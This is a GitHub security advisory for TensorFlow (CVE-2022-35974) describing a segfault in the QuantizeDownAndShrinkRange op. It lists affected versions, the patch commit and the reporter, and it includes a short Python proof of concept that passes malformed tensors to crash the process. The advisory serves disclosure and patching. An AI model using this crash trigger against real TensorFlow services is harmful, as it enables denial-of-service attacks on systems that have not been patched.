# [M] TensorFlow vulnerable to segfault in `QuantizeDownAndShrinkRange`

## Summary
Severity: Medium
Advisory: GHSA-vgvh-2pf4-jr2x
CVE: CVE-2022-35974
CWE: CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-vgvh-2pf4-jr2x
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
If `QuantizeDownAndShrinkRange` is given nonscalar inputs for `input_min` or `input_max`, it results in a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

out_type = tf.quint8
input = tf.constant([1], shape=[3], dtype=tf.qint32)
input_min = tf.constant([], shape=[0], dtype=tf.float32)
input_max = tf.constant(-256, shape=[1], dtype=tf.float32)
tf.raw_ops.QuantizeDownAndShrinkRange(input=input, input_min=input_min, input_max=input_max, out_type=out_type)
```

### Patches
We have patched the issue in GitHub commit [73ad1815ebcfeb7c051f9c2f7ab5024380ca8613](https://github.com/tensorflow/tensorflow/commit/73ad1815ebcfeb7c051f9c2f7ab5024380ca8613).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vgvh-2pf4-jr2x
- https://nvd.nist.gov/vuln/detail/CVE-2022-35974
- https://github.com/tensorflow/tensorflow/commit/73ad1815ebcfeb7c051f9c2f7ab5024380ca8613
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
